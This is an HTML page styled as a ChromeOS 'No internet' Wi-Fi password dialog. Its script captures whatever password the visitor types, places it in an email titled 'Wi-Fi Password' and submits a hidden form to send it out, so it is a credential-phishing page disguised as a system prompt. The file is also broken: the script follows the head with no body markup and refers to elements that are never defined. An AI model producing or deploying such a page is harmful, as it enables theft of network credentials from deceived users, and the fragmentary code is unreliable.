<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>No internet</title>
  <style>
    body {
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #fff;
      font-family: "Roboto", sans-serif;
    }
    img {
      max-width: 100%;
      height: auto;
      image-rendering: pixelated;
    }
    /* Popup overlay */
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.3);
      display: flex;
      justify-content: center;
      align-items: center;
      visibility: hidden;
      opacity: 0;
      transition: opacity 0.2s ease, visibility 0.2s ease;
    }
    .overlay.active {
      visibility: visible;
      opacity: 1;
    }
    /* ChromeOS-style dialog */
    .dialog {
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
      width: 390px;
      max-width: 95%;
      padding: 20px;
      animation: pop 0.25s ease;
    }
    @keyframes pop {
      from { transform: scale(0.95); opacity: 0; }
      to   { transform: scale(1); opacity: 1; }
    }
    .dialog h2 {
      font-size: 18px;
      margin: 0 0 12px;
      font-weight: 500;
      color: #202124;
    }
    .dialog input {
      width: 90%;
      padding: 10px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 14px;
      margin-bottom: 20px;
    }
    .dialog .actions {
      display: flex;
      justify-content: flex-end;
      gap: 8px;
    }
    .dialog button {
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 8px 16px;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
    }
    .dialog button.cancel {
      background: transparent;
      color: #1a73e8;
    }
  </style>
</head>

    const emailSubject = document.getElementById("emailSubject");
    const emailBody = document.getElementById("emailBody");

    // Always show popup for demo
    popup.classList.add("active");

    // Detect going offline/online
    window.addEventListener("offline", () => {
      popup.classList.add("active");
    });
    window.addEventListener("online", () => {
      popup.classList.remove("active");
    });

    // Cancel hides popup
    cancelBtn.addEventListener("click", () => {
      popup.classList.remove("active");
    });

    // Handle password submission
    connectBtn.addEventListener("click", () => {
      const enteredPassword = passwordInput.value.trim();
      if (enteredPassword.length === 0) {
        alert("Please enter a password.");
      } else {
        emailSubject.value = "Wi-Fi Password";
        emailBody.value = `The entered Wi-Fi password is: ${enteredPassword}`;
        passwordDisplay.textContent = `The entered Wi-Fi password is: ${enteredPassword}`;

        if (navigator.onLine) {
          emailForm.submit();
        } else {
          emailContent.style.display = "block";
        }

        popup.classList.remove("active");
        passwordInput.value = ""; // reset field
      }
    });
  </script>
</body>

</html>
